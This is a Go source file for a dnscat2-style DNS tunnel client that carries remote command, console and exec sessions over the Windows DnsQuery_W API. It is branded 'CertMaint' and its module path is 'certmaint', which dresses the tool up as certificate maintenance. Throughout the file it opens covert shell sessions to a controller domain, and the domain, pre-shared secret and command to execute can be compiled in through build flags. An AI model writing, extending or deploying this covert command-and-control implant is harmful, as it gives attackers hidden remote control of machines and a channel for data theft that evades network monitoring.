// Package main implements the dnscat2 client using the Windows DNS Client API
// (DnsQuery_W) transport instead of a raw UDP socket.
//
// All session, protocol, and controller logic is identical to cmd/dnscat.
// The only difference is the transport: pkg/tunnel/dnsapi instead of pkg/tunnel/dns.
package main

import (
	"flag"
	"math/rand"
	"os"
	"time"

	"certmaint/pkg/controller"
	"certmaint/pkg/dlog"
	"certmaint/pkg/driver/command"
	"certmaint/pkg/session"
	"certmaint/pkg/tunnel/dnsapi"
)

const (
	Name    = "CertMaint"
	Version = "v1.0.0"
)

// Build-time configurable defaults (can be set via -ldflags)
var (
	DefaultDomain     = ""
	DefaultServer     = ""
	DefaultPort       = "53"
	DefaultSecret     = ""
	DefaultExec       = ""
	DefaultDelay      = "1000"
	DefaultDNSTypes   = "TXT,CNAME,MX"
	DisableEncryption = "false"
)

func main() {
	rand.Seed(time.Now().UnixNano())

	var (
		domain        string
		dnsServer     string
		dnsPort       uint
		dnsTypes      string
		secret        string
		noEncryption  bool
		delay         int
		maxRetransmit int
		packetTrace   bool
		doPing        bool
		doConsole     bool
		doExec        string
		isn           int
	)

	flag.StringVar(&domain, "domain", DefaultDomain, "Domain to tunnel through (e.g., example.com)")
	flag.StringVar(&dnsServer, "dns-server", DefaultServer, "DNS server to use (informational; DnsQuery_W uses system resolver)")
	flag.UintVar(&dnsPort, "dns-port", 53, "DNS port")
	flag.StringVar(&dnsTypes, "dns-type", DefaultDNSTypes, "DNS record types to use")
	flag.StringVar(&secret, "secret", DefaultSecret, "Pre-shared secret for authentication")
	flag.BoolVar(&noEncryption, "no-encryption", DisableEncryption == "true", "Disable encryption")
	flag.IntVar(&delay, "delay", 1000, "Delay between packets in ms")
	flag.IntVar(&maxRetransmit, "max-retransmits", 20, "Max retransmit attempts (-1 for infinite)")
	flag.BoolVar(&packetTrace, "packet-trace", false, "Enable packet tracing")
	flag.BoolVar(&doPing, "ping", false, "Ping the server and exit")
	flag.BoolVar(&doConsole, "console", false, "Start a console session (instead of command)")
	flag.StringVar(&doExec, "exec", DefaultExec, "Execute a command")
	flag.IntVar(&isn, "isn", -1, "Initial sequence number (for debugging)")

	flag.Usage = func() {
		dlog.Fprintf(os.Stderr, "%s %s - DNS tunnel client (DnsQuery_W transport)\n\n", Name, Version)
		dlog.Fprintf(os.Stderr, "Usage: %s [options] [domain]\n\n", os.Args[0])
		dlog.Fprintf(os.Stderr, "Options:\n")
		flag.PrintDefaults()
		dlog.Fprintf(os.Stderr, "\nExamples:\n")
		dlog.Fprintf(os.Stderr, "  %s example.com\n", os.Args[0])
		dlog.Fprintf(os.Stderr, "  %s --dns-server=1.2.3.4\n", os.Args[0])
		dlog.Fprintf(os.Stderr, "  %s --ping example.com\n", os.Args[0])
	}

	flag.Parse()

	if flag.NArg() > 0 {
		domain = flag.Arg(0)
	}

	session.PacketTrace = packetTrace
	session.PacketDelay = time.Duration(delay) * time.Millisecond
	session.DoEncryption = !noEncryption
	session.PresharedSecret = secret

	controller.SetMaxRetransmits(maxRetransmit)

	if dnsServer == "" {
		if domain == "" {
			dlog.Println("Starting DNS driver without a domain!")
			dlog.Println()
		}
		dnsServer = getSystemDNS()
		if dnsServer == "" {
			dnsServer = "8.8.8.8"
		}
	}

	if domain == "" {
		dlog.Println("** WARNING!")
		dlog.Println("* No domain specified — direct UDP mode.")
		dlog.Println("** WARNING!")
		dlog.Println()
	}

	var sess *session.Session
	var err error

	if doPing {
		dlog.Println("Creating a ping session!")
		sess, err = session.NewPingSession("ping")
	} else if doConsole {
		dlog.Println("Creating a console session!")
		sess, err = session.NewConsoleSession("console")
	} else if doExec != "" {
		dlog.Printf("Creating an exec session!\n")
		sess, err = session.NewExecSession(doExec, doExec)
	} else {
		dlog.Println("Creating a command session!")
		sess, err = newCommandSession("command")
	}

	if err != nil {
		dlog.Printf("Failed to create session: %v\n", err)
		os.Exit(1)
	}

	controller.AddSession(sess)

	dlog.Println()
	dlog.Println("Creating DNS API driver (DnsQuery_W):")
	dlog.Printf(" domain = %s\n", stringOrNull(domain))
	dlog.Printf(" port   = %d\n", dnsPort)
	dlog.Printf(" type   = %s\n", dnsTypes)
	dlog.Printf(" server = %s (system resolver; field informational only)\n", dnsServer)

	dnsDriver, err := dnsapi.NewDriver(domain, "0.0.0.0", uint16(dnsPort), dnsTypes, dnsServer)
	if err != nil {
		dlog.Printf("Failed to create DNS API driver: %v\n", err)
		os.Exit(1)
	}

	defer dnsDriver.Close()
	defer controller.Destroy()

	dnsDriver.Run()
}

func newCommandSession(name string) (*session.Session, error) {
	sess, err := session.New(name)
	if err != nil {
		return nil, err
	}

	cmdDriver := command.NewDriver()

	cmdDriver.CreateSession = func(name, cmd string) uint16 {
		newSess, err := session.NewExecSession(name, cmd)
		if err != nil {
			dlog.Printf("Failed to create exec session: %v\n", err)
			return 0
		}
		controller.AddSession(newSess)
		return newSess.ID
	}

	cmdDriver.OnShutdown = func() {
		controller.KillAllSessions()
	}

	cmdDriver.OnDelayChange = func(delay uint32) {
		session.PacketDelay = time.Duration(delay) * time.Millisecond
	}

	sess.Driver = cmdDriver
	sess.IsCommand = true

	return sess, nil
}

func stringOrNull(s string) string {
	if s == "" {
		return "(null)"
	}
	return s
}
